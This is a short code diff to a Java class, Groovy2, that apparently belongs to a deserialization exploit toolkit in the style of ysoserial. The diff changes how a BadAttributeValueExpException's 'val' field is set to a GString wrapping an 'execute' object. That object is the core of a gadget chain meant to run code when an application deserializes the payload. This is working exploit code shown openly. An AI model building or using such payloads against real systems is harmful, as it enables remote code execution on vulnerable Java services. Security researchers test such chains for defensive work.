@@ -25,9 +25,8 @@ public class Groovy2 implements ObjectPayload<Object> {
             Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
         }
         BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
-        Field valfield = val.getClass().getDeclaredField("val");
-        valfield.setAccessible(true);
-        valfield.set(val, gString);
+        Reflections.setFieldValue(val,"val",gString);
+        Reflections.setFieldValue(gString,"values",(new Object[]{execute}));
         return val;
     }
 
